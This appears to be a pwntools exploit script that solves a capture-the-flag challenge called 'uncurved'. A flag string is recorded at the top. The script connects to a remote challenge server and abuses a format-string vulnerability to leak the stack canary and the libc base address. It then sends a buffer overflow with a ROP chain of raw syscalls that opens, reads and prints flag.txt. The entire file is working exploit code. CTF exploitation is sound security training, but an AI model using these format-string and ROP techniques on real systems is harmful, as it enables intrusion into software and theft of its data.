# DO{c4r3ful_w1th_p4tch3lf_0n_pr0duct1on_72bc04d8}
from pwn import *

elf = ELF("./uncurved")
ld = ELF("./ld-2.31.so")
libc = ELF("./libc-2.31.so")

target = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
target = remote("193.57.159.27", 27374)

target.sendlineafter(":", "whoamiT")

addrs = p64(0x404080) + p64(0x3fe438) + p64(0x404082) + p64(0x3fe43a)
addrs += "A"*0x60
target.sendafter(":", addrs)

#555556a9b2a0.80.7fa0cbb70e8e.a.0.800000000.555556a9b2a0.4141414141414141
fmt = "%25$p%27$p0x"
fmt += "%" + str(0x1357 - 34) + "c" + "%8$hn"
fmt += "%" + str(0x4080 - 0x1357) + "c" + "%9$hn"
fmt += "%" + str(0x140 - 0x80) + "c" + "%10$hhn" + "%11$hhn"

print("fmt len: " + hex(len(fmt)))
target.sendlineafter(":", fmt)

target.recvuntil("0x")
canary = int(target.recvuntil("0x", drop=True), 0x10)
libc_base = int(target.recvuntil("0x", drop=True), 0x10) - libc.sym['__libc_start_main'] - 234
log.info("canary: " + hex(canary))
log.info("LIBC Base: " + hex(libc_base))

target.recvuntil("Rythm ")
print("Entering sacred zone, close to getting flag :)")

pop_rdi = p64(libc_base + 0x0000000000026796)
pop_rsi = p64(libc_base + 0x000000000002890f)
pop_rdx = p64(libc_base + 0x00000000000cb1cd)
pop_rax = p64(libc_base + 0x000000000003ee88)
sys_ret = p64(libc_base + 0x00000000000580da)
buf = 0x4042d0

#gdb.attach(target, 'b *' + hex(u64(pop_rax)) + "\nc")# + '\nni'*6 + '\nx/40gx $rsp')
def sys_gen(rax, rdi, rsi, rdx):
    return pop_rax + p64(rax) + pop_rdi + p64(rdi) + pop_rsi + p64(rsi) + pop_rdx + p64(rdx) + sys_ret

file_to_be_read = "flag.txt\x00"
payload = "A"*0x88 + p64(canary) + p64(0)
payload += sys_gen(0, 0, buf, len(file_to_be_read))   #read flag.txt
payload += sys_gen(2, buf, 0, 0)        #open
#payload += "a"*8                       #crappy breakpoint
payload += sys_gen(0, 5, buf + 0x10, 0x80)   #read from flag.txt
payload += sys_gen(1, 1, buf + 0x10, 0x80)   #write flag
payload += sys_gen(60, 1337, 0, 0)      #exit
print target.sendlineafter(":", payload)

target.sendlineafter(":", "INPUT2")
target.sendlineafter(":", "INPUT3")

target.sendlineafter("INPUT3", file_to_be_read)

target.interactive()
